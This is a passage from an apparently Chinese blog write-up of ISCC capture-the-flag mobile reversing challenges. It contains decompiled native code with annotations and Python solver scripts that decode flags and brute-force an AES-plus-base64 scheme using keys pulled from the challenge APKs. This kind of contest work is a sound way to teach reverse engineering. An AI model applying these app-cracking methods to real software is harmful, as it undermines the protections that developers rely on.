class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (flag1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    flag_p4_1 = flag1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag_p4_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = !(flag1 &amp; <span class="number">1</span>);</span><br><span class="line">    indb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      inda = indb;</span><br><span class="line">      flag3 = flag2;</span><br><span class="line">      v17 = v12 &lt;&lt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        flag3 = flag_p1;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(flag3[inda] - <span class="number">65</span>) &gt; <span class="number">0x19</span>u )<span class="comment">// 检查是不是A-Z</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        flag_p4_2 = flag1_1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( flag_p4_2 &gt;= <span class="number">0xD</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      temp_inda3_ptr = &amp;temp[<span class="number">3</span> * inda];</span><br><span class="line">      std::string::<span class="built_in">basic_string</span>((<span class="keyword">int</span>)&amp;tmpStructPtr, (<span class="keyword">int</span>)temp_inda3_ptr);</span><br><span class="line">      flag4 = flag2;</span><br><span class="line">      temp_inda3_ptr1 = *(<span class="keyword">unsigned</span> __int8 *)temp_inda3_ptr;</span><br><span class="line">      <span class="keyword">if</span> ( !(flag1 &lt;&lt; <span class="number">31</span>) )</span><br><span class="line">        flag4 = flag_p1;</span><br><span class="line">      flag_i_chr = (<span class="keyword">unsigned</span> __int8)flag4[inda];</span><br><span class="line">      <span class="keyword">if</span> ( temp_inda3_ptr1 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        str_i_realLen = *(_QWORD *)(temp_inda3_ptr + <span class="number">1</span>);<span class="comment">// 单位是8个byte</span></span><br><span class="line">        str_i_ptr = temp_inda3_ptr[<span class="number">2</span>];</span><br><span class="line">        str_i_realLen1 = str_i_realLen;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str_i_realLen1 = temp_inda3_ptr1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        str_i_ptr = (<span class="keyword">char</span> *)temp_inda3_ptr + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( str_i_realLen1 )</span><br><span class="line">      &#123;</span><br><span class="line">        fstOcurPtr = <span class="built_in">memchr</span>(str_i_ptr, flag_i_chr, str_i_realLen1);<span class="comment">// 定位str_i_ptr中flag_i_chr第一次出现的位置，并返回从该位置开始的字符子串的指针，没有就返回Null</span></span><br><span class="line">        <span class="keyword">if</span> ( fstOcurPtr )</span><br><span class="line">        &#123;</span><br><span class="line">          lostLen = fstOcurPtr - (_BYTE *)str_i_ptr;</span><br><span class="line">          <span class="keyword">if</span> ( fstOcurPtr - (_BYTE *)str_i_ptr &gt;= <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            indcInLostLen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              str_i_chr_i_index0 = str_i_ptr2;</span><br><span class="line">              str_i_realLen2 = <span class="built_in">HIDWORD</span>(tmpStructPtr);<span class="comment">// 取这个8byte数据的最高4byte，实际取出了realLen</span></span><br><span class="line">              str_i_ptr4 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">              str_i_fLen1_And1 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>;<span class="comment">// 取这个8byte数据的最低1byte，实际取出了fLen，然后AND 1，似乎是判断str类型</span></span><br><span class="line">              <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">              &#123;</span><br><span class="line">                str_i_realLen2 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                str_i_ptr4 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              str_i_chr_i = *str_i_ptr4;        <span class="comment">// 用来记录头一个chr，然后再208行补到最后，完成字符串左移</span></span><br><span class="line">              <span class="keyword">if</span> ( str_i_realLen2 )</span><br><span class="line">              &#123;</span><br><span class="line">                str_i_index1_ptr = (<span class="keyword">char</span> *)str_i_ptr2 + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">                  str_i_index1_ptr = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">2</span>;</span><br><span class="line">                str_i_chr_i_index1 = *str_i_index1_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">                  str_i_chr_i_index0 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">                *str_i_chr_i_index0 = str_i_chr_i_index1;<span class="comment">// str_i[0] = str_i[1]</span></span><br><span class="line">                str_i_realLen4 = <span class="built_in">HIDWORD</span>(tmpStructPtr);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                  str_i_realLen4 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                v36 = !(<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( str_i_realLen4 &gt;= <span class="number">2</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  inde = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">do</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    str_i_ptr1 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">                    v39 = v36;</span><br><span class="line">                    str_i_next_chr = (<span class="keyword">char</span> *)str_i_ptr2 + inde + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( v39 )</span><br><span class="line">                      str_i_next_chr = (<span class="keyword">char</span> *)&amp;tmpStructPtr + inde + <span class="number">2</span>;</span><br><span class="line">                    temp_chr = *str_i_next_chr;</span><br><span class="line">                    <span class="keyword">if</span> ( v39 )</span><br><span class="line">                      str_i_ptr1 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">                    str_i_ptr1[inde++] = temp_chr;</span><br><span class="line">                    str_i_realLen4 = <span class="built_in">HIDWORD</span>(tmpStructPtr);</span><br><span class="line">                    <span class="keyword">if</span> ( (<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                      str_i_realLen4 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                    v36 = !(<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( inde &lt; str_i_realLen4 );<span class="comment">// 这个while循环在把str_i循环左移一个byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                str_i_ptr4 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">                <span class="keyword">if</span> ( v36 )</span><br><span class="line">                  str_i_ptr4 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                str_i_realLen4 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              ++indcInLostLen;</span><br><span class="line">              str_i_ptr4[str_i_realLen4 - <span class="number">1</span>] = str_i_chr_i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( indcInLostLen != lostLen );</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      str_i_fLen2 = <span class="built_in">LOBYTE</span>(tmpStructPtr);</span><br><span class="line">      str_i_ptr5 = str_i_ptr2;</span><br><span class="line">      tmpStructPtr = <span class="number">0.0</span>;                       <span class="comment">// 重置tmpStructPtr ?</span></span><br><span class="line">      str_i_ptr2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( str_i_fLen2 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;aim + inda) = str_i_ptr5[<span class="number">9</span>];</span><br><span class="line">        <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(str_i_ptr5)</span></span>;            <span class="comment">// 立即清空经过循环左移之后的字符串</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>(tmpStructPtr) &lt;&lt; <span class="number">31</span> )</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(str_i_ptr2)</span></span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;aim + inda) = <span class="built_in">BYTE2</span>(str_i_ptr5);</span><br><span class="line">      &#125;</span><br><span class="line">      flag_p4_2 = flag_p4;</span><br><span class="line">      indb = inda + <span class="number">1</span>;</span><br><span class="line">      flag1_1 = flag1;</span><br><span class="line">      v14 = flag_p4;</span><br><span class="line">      v12 = !(flag1 &amp; <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (flag1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        v14 = flag1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( indb &gt;= v14 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)c, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    inda = <span class="number">0</span>;</span><br><span class="line">LABEL_58:</span><br><span class="line">    *(&amp;aim + inda + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)c, &amp;aim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="3-解密代码"><a href="#3-解密代码" class="headerlink" title="3 解密代码"></a>3 解密代码</h4><p>ISCC上面的apk会在一定的时间后被替换，把关键的数据抠出来，可以写个flag脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;51234&quot;</span>:<span class="string">&quot;127&quot;</span>, <span class="string">&quot;1234&quot;</span>:<span class="string">&quot;126&quot;</span>, <span class="string">&quot;5234&quot;</span>:<span class="string">&quot;125&quot;</span>, <span class="string">&quot;234&quot;</span>:<span class="string">&quot;124&quot;</span>, <span class="string">&quot;5134&quot;</span>:<span class="string">&quot;123&quot;</span>, <span class="string">&quot;134&quot;</span>:<span class="string">&quot;122&quot;</span>, <span class="string">&quot;534&quot;</span>:<span class="string">&quot;121&quot;</span>, <span class="string">&quot;34&quot;</span>:<span class="string">&quot;120&quot;</span>, <span class="string">&quot;5124&quot;</span>:<span class="string">&quot;119&quot;</span>, <span class="string">&quot;124&quot;</span>:<span class="string">&quot;118&quot;</span>, <span class="string">&quot;524&quot;</span>:<span class="string">&quot;117&quot;</span>, <span class="string">&quot;24&quot;</span>:<span class="string">&quot;116&quot;</span>, <span class="string">&quot;514&quot;</span>:<span class="string">&quot;115&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;114&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;113&quot;</span>, <span class="string">&quot;4&quot;</span>:<span class="string">&quot;112&quot;</span>, <span class="string">&quot;5123&quot;</span>:<span class="string">&quot;111&quot;</span>, <span class="string">&quot;123&quot;</span>:<span class="string">&quot;110&quot;</span>, <span class="string">&quot;523&quot;</span>:<span class="string">&quot;109&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;108&quot;</span>, <span class="string">&quot;513&quot;</span>:<span class="string">&quot;107&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;106&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;105&quot;</span>, <span class="string">&quot;3&quot;</span>:<span class="string">&quot;104&quot;</span>, <span class="string">&quot;512&quot;</span>:<span class="string">&quot;103&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;102&quot;</span>, <span class="string">&quot;52&quot;</span>:<span class="string">&quot;101&quot;</span>, <span class="string">&quot;2&quot;</span>:<span class="string">&quot;100&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;99&quot;</span>, <span class="string">&quot;1&quot;</span>:<span class="string">&quot;98&quot;</span>, <span class="string">&quot;5&quot;</span>:<span class="string">&quot;97&quot;</span>&#125;</span><br><span class="line">aim = <span class="string">&quot;52405201052052301230540405120140305240&quot;</span> </span><br><span class="line">AIM =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">pos, path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> AIM</span><br><span class="line">    <span class="comment"># print(pos, path)</span></span><br><span class="line">    <span class="keyword">if</span>(pos &gt;= <span class="built_in">len</span>(aim)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span> , path)</span><br><span class="line">        AIM = path.upper()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, <span class="built_in">len</span>(aim) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(aim[pos:i] <span class="keyword">in</span> d <span class="keyword">and</span> aim[i]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            dfs(i+<span class="number">1</span>, path + <span class="built_in">chr</span>(<span class="built_in">int</span>(d[ aim[pos:i] ])) )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="comment"># aim = &quot;UEBEMNQPGRHU&quot;</span></span><br><span class="line">    <span class="keyword">global</span> AIM</span><br><span class="line">    aim = AIM</span><br><span class="line">    adv = [<span class="number">3</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">    mat = [</span><br><span class="line">        <span class="string">&quot;MTURVPYCJGZOQNKASEWFIXBHLD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CKTUVBXSAFJDGHIMNYZOPQRWEL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;WXOPZGNVYDEFIJCBKARLUQHMST&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FBSNOPMACKDRQITUVWHZLJXYGE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;OMEJCXYFZBQRAPGSDTINKLUHVW&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XASQGMTFIRBVHEJUOCDYZPKLNW&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EHWUVRYOPQSIBXJACTZGMNDFLK&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VWNIKAXMOGHLZBRDQJEUYFPCST&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FDXYUKOPJMBCZLIGNVWSTEHAQR&quot;</span>,</span><br><span class="line">        <span class="string">&quot;NSKBRTUZEJOPGHIFXCDAVWQYLM&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CLYMVHXASTKNWIUOPZJDBQGREF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;AYTNCBDRSQLZWXOPKJGEHIMFUV&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FLAG: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        s = mat[adv[ind] -<span class="number">1</span>]</span><br><span class="line">        indexx = s.index(aim[ind])</span><br><span class="line">        align_index = (indexx - <span class="number">9</span> + <span class="number">26</span>) % <span class="number">26</span></span><br><span class="line">        <span class="built_in">print</span>(s[align_index], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><h1 id="mobileC"><a href="#mobileC" class="headerlink" title="mobileC"></a>mobileC</h1><p>又是一道native逻辑看起来很复杂但是整体算法很简单的题，总的来说多动态调试做得快些。</p><p>Java层比较直接，把flag抠出来AES加密一下再转base64得到flagCipher，这个过程的密钥和偏移是固定的。然后把flagCipher和flag本身传到native层的GetStr()函数中，检查返回值是不是”MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=”。</p><p>在native层，GetStr函数其实被动态注册替换成了GetStrcT，要去JNI_OnLoad中找对函数才能动态调试。（难怪一开始IDA动态调试老是断不下来）</p><p>在GetStrcT中，乍一看逻辑是非常的复杂，而且IDA还原得也不是很好。很多变量前后的符号不一致，静态分析起来很烧脑。此时就需要多用动态调试，关注flagCipher和flag的值传递到了哪些变量中。</p><p>总的来说，对于flag，算法先去找”_“符号，然后取”_“之后的6个byte，所以flag是ISCC{xxxxxx_yyyyyyyy}的形式。这6个byte应该对应ascii的0-5，如果不是这个范围会调整为’1’，然后经过vmovl_u16、vmovl_u8这类指令变换为对应的数字0-5，记作key[6]。（因为是动态调试观察结果，所以具体的运算过程没有去关心）</p><p>对于flagCipher，它是AES+base64过后的形式，先添加”=”把长度补成6的倍数，然后重新排列。因为Java层的目标值是48位，所以flagCipher补足之后也该是48位。先把flagCipher分割成6byte x 8clip，然后枚举0&lt;=key[i]&lt;6，把8clip中的第key[i]位取出来依次连接在一起。以key=[0,0,1,2,3,4]为例，重排前后的值如下图所示。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220520145459.png" alt="image-20220520145452327"></p><p>现在，反过来从”MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=”逆推。因为这个字符串内部没有重复，所以key是012345的全排列。我们枚举所有的全排列，然后按照算法还原为flagCipher，然后去掉末尾的”====”检查是不是base64的格式，接着用AES去解密，最后看看解出来的flag中”_”之后的6个byte是否和key对得上。事实上，因为AES算法的原因，只需要检查当前还原的flagCipher是否能够成功解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">from</span>  Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> it</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=&quot;</span></span><br><span class="line">s = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">px = [ i <span class="keyword">for</span>  i <span class="keyword">in</span> it.permutations(s, <span class="number">6</span>)]</span><br><span class="line">cipherList = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherList</span>():</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> px:</span><br><span class="line">        plain = [<span class="string">&quot;=&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        pp = <span class="built_in">list</span>(p)</span><br><span class="line">        ind = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ind1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> ind2 <span class="keyword">in</span> <span class="built_in">range</span>(pp[ind1], <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">                plain[ind2] = c[ind]</span><br><span class="line">                ind += <span class="number">1</span></span><br><span class="line">                <span class="comment"># print(&quot;(%d)&quot; % (ind))</span></span><br><span class="line">        ci = <span class="string">&quot;&quot;</span>.join(plain)</span><br><span class="line">        <span class="keyword">if</span>(ci[-<span class="number">5</span>:] == <span class="string">&quot;=====&quot;</span>):</span><br><span class="line">            cipherList.append(ci[<span class="number">0</span>:-<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> cipherList</span><br><span class="line"></span><br><span class="line"><span class="comment">#AES轮子来自 https://blog.51cto.com/u_14246112/3231470</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrpCrypt</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line">        <span class="comment"># self.iv = Random.new().read(AES.block_size)</span></span><br><span class="line">        self.iv = <span class="built_in">bytes</span>(<span class="string">&quot;aUBTJjg4Q2NDLg==&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(type(self.iv), type(self.key), type(self.mode), self.mode)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密函数，如果text不足16位就用空格补足为16位，</span></span><br><span class="line">    <span class="comment"># 如果大于16当时不是16的倍数，那就补足为16的倍数。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        text = text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line">        cryptor = AES.new(self.key, self.mode,self.iv)</span><br><span class="line">        <span class="comment"># 这里密钥key 长度必须为16（AES-128）,</span></span><br><span class="line">        <span class="comment"># 24（AES-192）,或者32 （AES-256）Bytes 长度</span></span><br><span class="line">        <span class="comment"># 目前AES-128 足够目前使用</span></span><br><span class="line">        length = <span class="number">16</span></span><br><span class="line">        count = <span class="built_in">len</span>(text)</span><br><span class="line">        <span class="keyword">if</span> count &lt; length:</span><br><span class="line">            add = (length - count)</span><br><span class="line">            <span class="comment"># \0 backspace</span></span><br><span class="line">            <span class="comment"># text = text + (&#x27;\0&#x27; * add)</span></span><br><span class="line">            text = text + (<span class="string">&#x27;\0&#x27;</span> * add).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; length:</span><br><span class="line">            add = (length - (count % length))</span><br><span class="line">            <span class="comment"># text = text + (&#x27;\0&#x27; * add)</span></span><br><span class="line">            text = text + (<span class="string">&#x27;\0&#x27;</span> * add).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        self.ciphertext = cryptor.encrypt(text)</span><br><span class="line">        <span class="comment"># 因为AES加密时候得到的字符串不一定是ascii字符集的，输出到终端或者保存时候可能存在问题</span></span><br><span class="line">        <span class="comment"># 所以这里统一把加密后的字符串转化为16进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> b2a_hex(self.ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">        <span class="comment"># return plain_text.rstrip(&#x27;\0&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pc = PrpCrypt(<span class="string">&#x27;QERAPG9dPyZfTC5f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ciphers = getCipherList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ci <span class="keyword">in</span> ciphers:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e = b2a_hex(base64.b64decode(ci))</span><br><span class="line">            d = pc.decrypt(e).encode() <span class="comment"># 解密</span></span><br><span class="line">            <span class="built_in">print</span>(ci,d)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="EasyCryMobile"><a href="#EasyCryMobile" class="headerlink" title="EasyCryMobile"></a>EasyCryMobile</h1><p>apk要求Android12L，似乎是难以满足的，所以只能静态分析。isccgetflag54下面的3个activity各自有一些校验逻辑，抠出来逆一下就好。第3个activity用用z3求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 